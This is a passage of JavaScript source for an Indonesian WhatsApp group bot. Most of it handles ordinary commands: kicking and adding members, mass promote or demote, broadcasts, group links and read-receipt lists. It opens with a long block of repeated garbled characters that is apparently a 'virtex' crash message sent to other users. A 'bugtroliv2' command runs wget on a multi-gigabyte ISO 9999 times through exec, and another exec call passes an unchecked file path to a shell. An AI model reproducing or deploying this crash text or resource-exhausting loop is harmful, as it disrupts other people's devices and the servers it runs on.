*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*`)
break
case 'trolikeun':
  if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
				syaa.toggleDisappearingMessages(from)
				syaa.toggleDisappearingMessages(from)
				break
				case 'bugtroliv2':
				  if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
				for (let i = 0; i < 9999; i++) {
				exec('wget https://ftp.halifax.rwth-aachen.de/blackarch/iso/blackarch-linux-full-2020.12.01-x86_64.iso', (err, stdout) => {
				if (err) throw err
				console.log('ðŸ”¥SUKSESðŸ”¥')
				console.log('ðŸ”¥') 
				})
				}
				break
      case "autojoin":
        if (!isGroup) return reply("Khusus di grup");
        if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
        if (args[0] == "on") {
          if (autojoin == true) return reply("Sudah aktif!!");
          autojoin = true;
          reply("Sukses mengaktifkan autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Sukses mematikan autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

      //------------------< Fitur Grup >------------------
      case 'listonline':
             if (!isGroup) return reply(`*Only group*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(syaa.chats.get(ido).presences), syaa.user.jid]
             syaa.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
        /////FUNCTION

//////function end
      case "sider": //copas dari stikerinbot
        if (!m.quoted) throw `Balas pesan bot!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await syaa.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await syaa.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} tersisa` : ""}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim();
        reply(txt, null, {
          contextInfo: {
            mentionedJid: syaa.parseMention(txt),
          },
        });
        break;
      case "q":
        if (!isOwner && !mek.key.fromMe)return reply(mess.own)
        if (!m.quoted) return reply("reply message!");
        let qse = syaa.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case "kick":
        case "out":
          case "kik":
            case "keluar":
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag target yang ingin di kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          syaa.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          syaa.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          syaa.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;
        case 'add':
  try {
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)           
  if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
  if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
  entah = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
  response = await syaa.groupAdd(from, [entah])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
if(inv[0].code == 403) return reply('Gagal, Karena Di Private T_T')
if(inv[0].code == 408) return reply('Gagal, Karena Target BaruÂ² Saja Keluar')
if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target T_T')
} else {
  entah = mek.message.extendedTextMessage.contextInfo.participant
 response = await syaa.groupAdd(from, [entah])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
if(inv[0].code == 403) return reply('Gagal, Karena Di Private T_T')
if(inv[0].code == 408) return reply('Gagal, Karena Target BaruÂ² Saja Keluar')
if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target T_T')
}
} catch {
return 
}
  break
      case "getbio":
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await syaa.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
        case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.own)
		if (!isGroup) return reply("Group Obly")
		if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut")
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                syaa.groupDemoteAdmin(from, members_id)
                break
                case "promoteall":
		if (!isOwner && !mek.key.fromMe) return reply(mess.own)
		if (!isGroup) return reply("Group Obly")
		if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut")
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                syaa.groupMakeAdmin(from, members_id)
                break
case "linkgc":
case "linkgrup":
case "link":
case "linkgrop":
case "linkgroup":
  ///Fix Work By Arasya
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot bukan Admin Cok')
linkgc = await syaa.groupInviteCode(from)
yeh = `\`\`\`ã€Œ Link Group ã€\`\`\`\nâ€¢> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein, shareee_`
syaa.sendMessage(from, yeh, text, { quoted: mek })
break
      // Get Name
      case "getname":
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          syaa.contacts[ambl] != undefined
            ? syaa.contacts[ambl].sname || syaa.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        syaa.groupUpdateDescription(from, `${args.join(" ")}`);
        syaa.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
        case 'setppgrup':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (isQuotedImage) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
   let media = await syaa.downloadMediaMessage(encmedia)
   syaa.updateProfilePicture(from, media)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   } else if (isQuotedSticker){
   if (mek.message.videoMessage) return reply('Error Bro Wkwkwk')
   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   media = await syaa.downloadAndSaveMediaMessage(encmedia)
   ran = getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
   fs.unlinkSync(media)
   if (err) return reply('Gagal, hehehe')
   buffer = fs.readFileSync(ran)
   syaa.updateProfilePicture(from, buffer)
   fs.unlinkSync(ran)
   })
   } else {
   reply(`Kirim atau tag gambar/sticker dengan caption ${prefix}setppgrup ya sayang ðŸ’•`)
   }
   break
        case 'setprofile':
				case 'setpp':
				syaa.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await syaa.downloadAndSaveMediaMessage(enmediau)
					await syaa.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
        case "bc":  
        case "bcimage":  
        case "broadcast":  
                   if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
					if (args.length < 1) return reply('.......')
					ini_bc = args.join(' ')
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					buff = await syaa.downloadMediaMessage(encmedia)
					for (let _ of anu) {
						syaa.sendMessage(_.jid, buff, image, {quoted:fakestatus ,caption: `ã€Œ  *BROADCAST* ã€\n\n${ini_bc}`})
					}
					reply('```Success Broadcast```')
					} else {
					for (let _ of anu) {
					syaa.sendMessage(_.jid, `*BROADCAST*\n${ini_bc}`, text, { contextInfo: { mentionedJid: [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
					}
					reply('```Success Broadcast```')
					}
					break
case 'tobc':
				if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
				syaa.updatePresence(from, Presence.composing)
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, buff, audio, { quoted: fakestatus })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, buff, sticker, { quoted: fakestatus, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
		case "bcsticker":
        case "bcstik":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, sticker, {quoted:meki})
						}
						reply('Suksess broadcast')
					}
					break
         case "bcvideo":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
